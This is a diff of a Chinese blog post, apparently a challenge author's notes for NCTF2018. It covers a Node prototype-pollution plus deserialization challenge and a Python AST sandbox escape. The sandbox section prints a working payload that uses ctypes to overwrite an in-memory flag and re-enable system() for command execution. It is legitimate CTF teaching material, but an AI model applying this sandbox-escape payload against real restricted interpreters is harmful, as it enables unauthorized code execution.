@@ -1,13 +1,13 @@
-<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><title>NCTF2018 出题笔记 [ 梅子酒の笔记本 ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script></head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel" href="https://github.com/meizjm3i">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Meizj's Blog</a></div><article id="post"><h1 id="postTitle">NCTF2018 出题笔记</h1><h1 id="nctf2018出题笔记"><a class="header-anchor" href="#nctf2018出题笔记"></a>NCTF2018出题笔记</h1>
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><title>NCTF2018 出题笔记 [ 梅子酒の笔记本 ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script></head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel" href="https://github.com/meizjm3i">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Meizj's Blog</a></div><article id="post"><h1 id="postTitle">NCTF2018 出题笔记</h1><h1 id="nctf2018出题笔记"><a class="markdownIt-Anchor" href="#nctf2018出题笔记"></a> NCTF2018出题笔记</h1>
 <p>往年十一月份的南邮校赛都是校内关起门来自己玩，今年和小伙伴们讨论了下，尝试着对外开放，并开始探索自己的难度定级，就结果来看，比赛的举办还算是比较顺利的。<br>
 这次比赛因为自己的事，正式出题其实在比赛开始前一周的时间才开始，题目也是比较简单的类型，分别是一个Node和一个Python。</p>
-<h2 id="milktea"><a class="header-anchor" href="#milktea"></a>MilkTea</h2>
+<h2 id="milktea"><a class="markdownIt-Anchor" href="#milktea"></a> MilkTea</h2>
 <p>题目本身给出了源码，可以直接下载到，通过审计题目代码可以发现漏洞触发点在反序列化的地方，而为了抵达这个反序列化，则需要让某个参数满足一定条件，题目的利用链非常的耿直，也没有什么坑。题目考点如下:</p>
 <ul>
 <li>Prototype Pollution</li>
 <li>Node Unserialize</li>
 </ul>
-<h3 id="prototype-pollution"><a class="header-anchor" href="#prototype-pollution"></a>Prototype Pollution</h3>
+<h3 id="prototype-pollution"><a class="markdownIt-Anchor" href="#prototype-pollution"></a> Prototype Pollution</h3>
 <p>第一个地方是原型链污染，参数判断位置在:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ser[<span class="string">"Flag"</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>往上追溯赋值链:</p>
@@ -19,18 +19,18 @@
 <blockquote>
 <p><a href="https://otakekumi.github.io/2018/09/11/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%8F%8A%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" target="_blank" rel="noopener">https://otakekumi.github.io/2018/09/11/JavaScript-原型链及变量覆盖/</a></p>
 </blockquote>
-<h3 id="node-unserialize"><a class="header-anchor" href="#node-unserialize"></a>Node Unserialize</h3>
+<h3 id="node-unserialize"><a class="markdownIt-Anchor" href="#node-unserialize"></a> Node Unserialize</h3>
 <p>第二个点就是node的反序列化，算是烂大街型的洞了，直接贴一个参考链接:</p>
 <blockquote>
 <p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">https://paper.seebug.org/213/</a></p>
 </blockquote>
-<h2 id="first-blood-of-homura"><a class="header-anchor" href="#first-blood-of-homura"></a>First Blood Of Homura</h2>
+<h2 id="first-blood-of-homura"><a class="markdownIt-Anchor" href="#first-blood-of-homura"></a> First Blood Of Homura</h2>
 <p>这个题其实是个AST沙盒绕过，题目核心思想其实是通过ctypes去修改变量的值，达到绕过的目的，题目考点如下:</p>
 <ul>
 <li>Python Sandbox</li>
 <li>AST bypass</li>
 </ul>
-<h3 id="python-sandbox"><a class="header-anchor" href="#python-sandbox"></a>Python Sandbox</h3>
+<h3 id="python-sandbox"><a class="markdownIt-Anchor" href="#python-sandbox"></a> Python Sandbox</h3>
 <p>题目本事环境是个沙盒，nc连接之后会得到一个python的命令行，连接时长为10s，选手需要在10s内getshell，因此需要不断尝试。<br>
 因为使用的模板的问题，在输出的缓冲区这儿有点小bug，因此像以下语句:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'print 1'</span>)</span><br><span class="line">print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
@@ -41,7 +41,7 @@
 <p>根据模块的调用关系可以确定题目的文件组成为:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| - nctf</span><br><span class="line">| - - __init__.py</span><br><span class="line">| - - nctf.py</span><br><span class="line">| - - nctf_config.py</span><br><span class="line">| - - utils.py</span><br><span class="line">| - main.py</span><br></pre></td></tr></table></figure>
 <p>读取源码完成后，可以发现题目本身开放了部分函数以及属性，这一部分在源码内可以看到。</p>
-<h3 id="ast-bypass"><a class="header-anchor" href="#ast-bypass"></a>AST Bypass</h3>
+<h3 id="ast-bypass"><a class="markdownIt-Anchor" href="#ast-bypass"></a> AST Bypass</h3>
 <p>首先通读源码可以发现沙盒环境中的函数是通过如下语句引入的:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_symbol</span><span class="params">(use_numpy=True, **kws)</span>:</span></span><br><span class="line">    symtable = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> PY:</span><br><span class="line">        <span class="keyword">if</span> para <span class="keyword">in</span> builtins:</span><br><span class="line">            symtable[para] = builtins[para]</span><br><span class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> MATH:</span><br><span class="line">        <span class="keyword">if</span> hasattr(math, para):</span><br><span class="line">            symtable[para] = getattr(math, para)</span><br><span class="line">    <span class="keyword">if</span> HAS_NUMPY <span class="keyword">and</span> use_numpy:</span><br><span class="line">        <span class="keyword">for</span> para <span class="keyword">in</span> NUMPY:     </span><br><span class="line">            <span class="keyword">if</span> hasattr(numpy, para):</span><br><span class="line">                symtable[para] = getattr(numpy, para)</span><br><span class="line">            <span class="keyword">if</span> hasattr(ctypes,para):</span><br><span class="line">                symtable[para] = getattr(ctypes,para)</span><br><span class="line">            <span class="keyword">if</span> hasattr(os,para):</span><br><span class="line">                symtable[para] = getattr(os,para)</span><br><span class="line">        <span class="keyword">for</span> name, para <span class="keyword">in</span> MATH2.items():</span><br><span class="line">            <span class="keyword">if</span> hasattr(numpy, para):</span><br><span class="line">                symtable[name] = getattr(numpy, para)</span><br><span class="line">            <span class="keyword">if</span> hasattr(ctypes,para):</span><br><span class="line">                symtable[name] = getattr(ctypes,para)</span><br><span class="line">            <span class="keyword">if</span> hasattr(os,para):</span><br><span class="line">                symtable[para]  = getattr(os,para)</span><br><span class="line">    symtable.update(LOCALFUNCS)</span><br><span class="line">    symtable.update(kws)</span><br><span class="line">    <span class="keyword">return</span> symtable</span><br></pre></td></tr></table></figure>
 <p>我们可以发现有以下几个模块涉及到了:</p>
@@ -59,7 +59,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCALFUNCS = &#123;<span class="string">'open'</span>: _open, <span class="string">'type'</span>: _type, <span class="string">'ctx'</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
 <p>攻击方法基本确认，通过ctypes修改ctx的值从而进行覆盖，恢复system函数的作用，payload如下:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cc=c_int.from_address(id(ctx)+(sizeof(c_long) + sizeof(c_voidp)));cc.value=<span class="number">0</span></span><br><span class="line">system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
-</article><div id="paginator"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script>$(window).on('load', function(){ 
+</article><div id="paginator"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script>$(window).on('load', function(){ 
 $('pre').addClass('prettyprint linenums');
 prettyPrint();
 });
